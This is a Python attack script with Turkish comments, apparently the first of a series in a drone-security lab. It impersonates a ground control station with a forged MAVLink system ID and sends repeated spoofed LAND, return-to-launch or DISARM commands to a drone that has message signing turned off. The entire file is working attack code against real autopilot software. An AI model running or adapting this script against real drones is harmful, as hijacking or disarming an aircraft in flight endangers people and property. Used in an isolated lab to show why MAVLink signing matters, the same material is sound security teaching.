#!/usr/bin/env python3
"""
Saldırı #1 — Yetkisiz komut enjeksiyonu.

Saldırgan, yer istasyonunu taklit ederek drone'a sahte bir komut (varsayılan:
LAND / iniş) gönderir. MAVLink mesaj imzalama kapalıyken drone bu komutu kabul
eder ve iner — yani kaçırılır.

Bu betik doğrudan bridge'in dinlediği komut portuna veya drone'a yazar.

Kullanım:
  python3 inject_land.py --target 127.0.0.1:14561 --cmd LAND
  python3 inject_land.py --target 127.0.0.1:14561 --cmd DISARM
"""
import argparse
import time

from pymavlink import mavutil
from pymavlink.dialects.v20 import common as mavlink2

# Saldırgan sahte bir sistem kimliği kullanır (255 = tipik GCS)
ATTACKER_SYSID = 255
ATTACKER_COMPID = 190

CMDS = {
    "LAND": (mavlink2.MAV_CMD_NAV_LAND, [0, 0, 0, 0, 0, 0, 0]),
    "RTL": (mavlink2.MAV_CMD_NAV_RETURN_TO_LAUNCH, [0, 0, 0, 0, 0, 0, 0]),
    "DISARM": (mavlink2.MAV_CMD_COMPONENT_ARM_DISARM, [0, 0, 0, 0, 0, 0, 0]),
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:14561",
                    help="komutun gönderileceği adres (bridge komut girişi)")
    ap.add_argument("--cmd", default="LAND", choices=list(CMDS.keys()))
    ap.add_argument("--repeat", type=int, default=3)
    args = ap.parse_args()

    conn = mavutil.mavlink_connection(
        "udpout:" + args.target,
        source_system=ATTACKER_SYSID,
        source_component=ATTACKER_COMPID,
        dialect="common",
    )
    cmd_id, params = CMDS[args.cmd]
    print(f"[saldiri] sahte {args.cmd} komutu -> {args.target} "
          f"(sysid={ATTACKER_SYSID})")
    for i in range(args.repeat):
        conn.mav.command_long_send(
            1, mavlink2.MAV_COMP_ID_AUTOPILOT1,  # hedef: drone
            cmd_id, 0, *params,
        )
        print(f"[saldiri] gonderildi ({i + 1}/{args.repeat})")
        time.sleep(0.5)
    print("[saldiri] tamam.")


if __name__ == "__main__":
    main()
